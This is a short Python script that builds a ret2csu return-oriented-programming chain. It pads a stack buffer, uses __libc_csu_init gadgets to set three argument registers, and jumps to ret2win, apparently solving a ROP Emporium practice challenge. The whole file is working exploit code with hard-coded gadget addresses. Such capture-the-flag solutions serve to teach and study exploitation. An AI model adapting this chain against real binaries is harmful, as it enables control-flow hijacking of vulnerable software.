#!/usr/bin/python3

PACK = lambda v, n: v.to_bytes(n, 'little')
PACKP = lambda v: PACK(v, 8)
PACKS = lambda s: bytes(s + (((len(s) & ~7) + 8) - len(s)) * "\x00", "utf-8")

def raw(stream):
    return "".join([f"\\x{b:02x}" for b in stream])

def echo(byte_stream):
    print(f"echo -ne {raw(byte_stream)}")

CSU_POP = 0x40069a
CSU_LOAD = 0x400680

POP_RDI = 0x4006a3

RET2WIN_PLT = 0x400510

_FINI = 0x600e48

def load_to_csu(edi, rsi, rdx, fn):
    return PACKP(CSU_POP) + PACKP(0) + PACKP(1) + PACKP(fn) + PACKP(edi) + PACKP(rsi) + PACKP(rdx)

rop = b" " * 40
rop += load_to_csu(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d, _FINI)
rop += PACKP(CSU_LOAD)
rop += PACKP(0) * 7
rop += PACKP(POP_RDI) + PACKP(0xdeadbeefdeadbeef)
rop += PACKP(RET2WIN_PLT)

echo(rop)

